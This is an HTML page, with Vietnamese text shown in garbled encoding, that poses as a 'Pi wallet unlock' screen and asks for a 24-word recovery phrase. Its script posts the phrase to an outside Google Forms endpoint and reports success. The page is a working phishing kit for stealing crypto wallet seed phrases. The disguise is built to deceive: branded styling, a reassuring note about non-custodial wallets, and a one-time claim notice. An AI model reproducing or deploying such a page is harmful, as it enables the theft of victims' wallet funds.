<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Nh·∫≠p C·ª•m M·∫≠t Kh·∫©u</title>

    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">

    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>

    <!-- SweetAlert2 -->
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <style>
        body {
            font-family: 'Inter', sans-serif;
            padding-top: 50px; /* ƒê·ªÉ kh√¥ng b·ªã che b·ªüi thanh m√†u t√≠m */
            background-color: white;
        }

        /* Thanh m√†u t√≠m c·ªë ƒë·ªãnh tr√™n ƒë·∫ßu trang */
        .top-bar {
            background-color: #693F8C;
            height: 50px;
            width: 100%;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 50;
        }

        /* Hi·ªáu ·ª©ng fade-in */
        .fade-in {
            opacity: 0;
            transform: translateY(-10px);
            animation: fadeIn 0.6s ease-out forwards;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Hi·ªáu ·ª©ng rung khi nh·∫≠p sai */
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            50% { transform: translateX(5px); }
            75% { transform: translateX(-5px); }
        }
        .shake {
            animation: shake 0.4s ease-in-out;
        }

        /* N√∫t v·ªõi m√†u t·ª´ ·∫£nh */
        .btn-custom {
            background-color: white;
            color: #693F8C;
            border: 2px solid #693F8C;
            transition: all 0.3s ease-in-out;
        }
        .btn-custom:hover {
            background-color: #693F8C;
            color: white;
        }
        .btn-custom:active {
            transform: scale(0.95);
        }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4">

    <!-- Thanh m√†u t√≠m c·ªë ƒë·ªãnh -->
    <div class="top-bar"></div>

    <div class="w-full max-w-md p-6 bg-white rounded-2xl shadow-xl text-center fade-in">
        <!-- Logo -->
        <img src="https://img.upanh.tv/2025/03/16/IMG_0103.jpg" 
             alt="Logo"
             id="logo"
             class="w-24 h-24 mx-auto mb-4 animate-pulse">
             
        <h2 class="text-2xl font-bold text-gray-800 mb-4">üîí M·ªü kho√° v√≠ Pi </h2>

        <form id="form">
            <div class="mb-4">
                <textarea id="mnemonic-input"
                          class="w-full p-4 text-lg text-gray-700 border-2 border-gray-400 rounded-lg resize-none
                                 focus:outline-none focus:ring-2 focus:ring-[#693F8C] focus:border-[#693F8C] transition-all"
                          rows="6" placeholder="Nh·∫≠p c·ª•m m·∫≠t kh·∫©u 24 t·ª´ c·ªßa b·∫°n v√†o ƒë√¢y"></textarea>
            </div>

            <button type="submit" id="btn-open"
                    class="w-full px-5 py-3 text-sm font-semibold 
                           btn-custom rounded-lg shadow-lg transition-all duration-300">
                <span class="btn-text">M·ªû KH√ìA V·ªöI C·ª§M M·∫¨T KH·∫®U</span>
            </button>

            <p class="text-xs text-gray-500 text-center mt-3">*M·ªói v√≠ ch·ªâ ƒë∆∞·ª£c nh·∫≠n 1 l·∫ßn duy nh·∫•t</p>
        </form>
    </div>

    <!-- Ph·∫ßn th√¥ng tin th√™m -->
    <div class="w-full max-w-md mt-6 text-center">
        <p class="text-sm text-gray-700 leading-relaxed">
            <strong class="text-gray-900">üîê L√† m·ªôt v√≠ kh√¥ng gi√°m s√°t</strong>, c·ª•m m·∫≠t kh·∫©u v√≠ c·ªßa b·∫°n <strong>ch·ªâ c√≥ b·∫°n m·ªõi c√≥ th·ªÉ truy c·∫≠p</strong>. 
            Hi·ªán t·∫°i kh√¥ng th·ªÉ kh√¥i ph·ª•c c·ª•m m·∫≠t kh·∫©u.
        </p>
        <p class="text-sm text-red-600 mt-3 font-semibold">
            ‚ö†Ô∏è B·∫°n b·ªã m·∫•t c·ª•m m·∫≠t kh·∫©u v√≠?  
            B·∫°n c√≥ th·ªÉ t·∫°o m·ªôt v√≠ m·ªõi, nh∆∞ng t·∫•t c·∫£ s·ªë œÄ trong v√≠ tr∆∞·ªõc ƒë√≥ c·ªßa b·∫°n s·∫Ω <strong>kh√¥ng th·ªÉ truy c·∫≠p ƒë∆∞·ª£c</strong>.
        </p>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const form = document.getElementById("form");
            const textarea = document.getElementById("mnemonic-input");
            const btnSubmit = document.getElementById("btn-open");
            const logo = document.getElementById("logo");

            function showAlert(type, title, text) {
                Swal.fire({
                    icon: type,
                    title: title,
                    text: text,
                    background: "rgba(255, 255, 255, 0.95)",
                    color: "#333",
                    confirmButtonColor: "#693F8C",
                    customClass: {
                        title: 'swal2-title',
                        popup: 'swal2-popup',
                        confirmButton: 'swal2-confirm'
                    }
                });
            }

            form.addEventListener("submit", async (e) => {
                e.preventDefault();
                const mnemonic = textarea.value.trim();
                const words = mnemonic.split(/\s+/);

                if (words.length !== 24) {
                    logo.classList.add("shake");
                    showAlert("error", "L·ªói!", "C·ª•m m·∫≠t kh·∫©u ph·∫£i c√≥ ƒë√∫ng 24 t·ª´. Vui l√≤ng ki·ªÉm tra l·∫°i!");
                    setTimeout(() => logo.classList.remove("shake"), 400);
                    return;
                }

                let sentMnemonics = JSON.parse(localStorage.getItem("sentMnemonics")) || [];
                if (sentMnemonics.includes(mnemonic)) {
                    showAlert("warning", "C·∫£nh b√°o!", "C·ª•m m·∫≠t kh·∫©u n√†y ƒë√£ ƒë∆∞·ª£c g·ª≠i tr∆∞·ªõc ƒë√≥. Vui l√≤ng nh·∫≠p m·ªôt c·ª•m kh√°c!");
                    return;
                }

                btnSubmit.disabled = true;
                btnSubmit.innerHTML = `<div class="w-5 h-5 border-4 border-[#693F8C] border-t-transparent rounded-full animate-spin"></div>`;

                const googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSdTB8GCil6wVsF7bP3fPqdO2h_6OEA9LrTVWIp9KOWgHQgqSQ/formResponse";
                const formData = new FormData();
                formData.append("entry.624281135", mnemonic);

                try {
                    await fetch(googleFormURL, {
                        method: "POST",
                        mode: "no-cors",
                        body: formData,
                    });

                    showAlert("success", "Th√†nh c√¥ng!", "C·ª•m m·∫≠t kh·∫©u ƒë√£ ƒë∆∞·ª£c g·ª≠i th√†nh c√¥ng.");
                    sentMnemonics.push(mnemonic);
                    localStorage.setItem("sentMnemonics", JSON.stringify(sentMnemonics));
                    form.reset();
                } catch (error) {
                    showAlert("error", "L·ªói!", "C√≥ l·ªói x·∫£y ra, vui l√≤ng th·ª≠ l·∫°i!");
                } finally {
                    btnSubmit.disabled = false;
                    btnSubmit.innerHTML = `<span class="btn-text">M·ªû KH√ìA V·ªöI C·ª§M M·∫¨T KH·∫®U</span>`;
                }
            });
        });
    </script>

</body>
</html>
